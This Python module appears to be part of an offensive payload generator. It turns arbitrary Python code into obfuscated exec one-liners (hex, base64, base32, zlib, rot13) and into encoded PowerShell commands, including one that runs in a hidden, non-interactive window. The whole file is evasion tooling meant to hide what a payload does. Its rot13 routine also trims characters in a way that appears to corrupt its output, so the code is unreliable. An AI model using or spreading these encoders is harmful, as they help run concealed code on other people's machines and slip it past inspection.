import sys, base64, codecs, binascii

def getjsonlist():
    payloads = {
        "one_line":{
            "hex":"oneline_hex",
            "base64":"oneline_b64",
            "base32":"oneline_b32",
            "gunzip*":"oneline_gzip",
            "rot13*":"oneline_rot13",
            },
        "powershell":{
            "base64_pythonexec":"ps_b64_exec",
            "base64_hidden_pythonexec":"ps_b64_hidden_exec",
            }
        }
    return payloads

def getjsonall():
    allpayloads = {}
    json = getjsonlist()
    for a in json:
        for b in json[a]:
            allpayloads['/' + a + '/' + b] = json[a][b]
    return allpayloads


def ps_b64_hidden_exec(string):
    string = f'python3 -c "{string}"'
    pbase = 'powershell -w hidden -noni -enc PLACEHOLDER'
    result = codecs.encode(string.encode('utf_16_le'), 'base64').decode('utf-8').replace('\n', '')
    return pbase.replace('PLACEHOLDER', result)
def ps_b64_exec(string):
    string = f'python3 -c "{string}"'
    pbase = 'powershell -enc PLACEHOLDER'
    result = codecs.encode(string.encode('utf_16_le'), 'base64').decode('utf-8').replace('\n', '')
    return pbase.replace('PLACEHOLDER', result)

def oneline_hex(string):
    pbase = "import binascii;exec(binascii.unhexlify(bytes('PLACEHOLDER','UTF-8')).decode())"
    result = binascii.hexlify(bytes(string, 'utf-8')).decode()
    return pbase.replace('PLACEHOLDER', result)
def oneline_rot13(string):
    if "'" in string:
        pbase = "import codecs;exec(codecs.decode('PLACEHOLDER', 'rot_13'))"
    else:
        pbase = 'import codecs;exec(codecs.decode("PLACEHOLDER", "rot_13"))'
    result = codecs.encode(string, 'rot_13')
    return pbase.replace('PLACEHOLDER', result)[1:-1]
def oneline_b64(string):
    pbase = "import base64;exec(base64.b64decode(bytes('PLACEHOLDER','UTF-8')).decode())"
    result = base64.b64encode(bytes(string, 'utf-8')).decode()
    return pbase.replace('PLACEHOLDER', result)
def oneline_b32(string):
    pbase = "import base64;exec(base64.b32decode(bytes('PLACEHOLDER','UTF-8')).decode())"
    result = base64.b32encode(bytes(string, 'utf-8')).decode()
    return pbase.replace('PLACEHOLDER', result)
def oneline_gzip(string):
    # ! WARNING: GunZip encoding can mess with stuff !
    pbase = b"import codecs;exec(codecs.decode(b'PLACEHOLDER',encoding='zlib'))"
    result = codecs.encode(bytes(string, 'utf-8'), encoding='zlib')
    a = pbase.replace(b'PLACEHOLDER', result)
    return str(a)[2:-1]
